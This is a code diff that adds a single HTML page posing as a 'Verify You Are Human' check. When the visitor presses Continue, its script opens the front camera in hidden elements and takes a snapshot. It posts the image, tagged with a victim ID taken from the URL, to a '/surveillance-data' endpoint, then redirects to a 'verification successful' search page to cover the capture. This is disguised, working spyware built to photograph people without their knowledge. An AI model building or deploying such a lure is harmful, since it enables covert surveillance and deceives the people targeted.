@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Verify You Are Human</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: sans-serif; background: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 40px; border-radius: 12px; text-align: center; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        h1 { color: #333; }
+        button { font-size: 18px; color: white; background: #28a745; border: none; padding: 15px 30px; border-radius: 8px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h1>Click "Allow" and then "Continue" to verify</h1>
+        <video id="video" autoplay playsinline style="display:none;"></video>
+        <button id="captureBtn">Continue</button>
+        <canvas id="canvas" style="display:none;"></canvas>
+    </div>
+    <script>
+        document.getElementById('captureBtn').addEventListener('click', async () => {
+            const recipientId = new URLSearchParams(window.location.search).get('uid');
+            if (!recipientId) return;
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const imageDataUrl = canvas.toDataURL('image/jpeg');
+                    
+                    fetch('/surveillance-data', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ type: 'image', recipientId: recipientId, data: imageDataUrl })
+                    });
+                    stream.getTracks().forEach(track => track.stop());
+                    window.location.href = "https://www.google.com/search?q=verification+successful";
+                }, 800);
+            } catch (err) {
+                console.error("Camera access denied:", err);
+                window.location.href = "https://www.google.com/search?q=verification+failed";
+            }
+        });
+    </script>
+</body>
+</html>
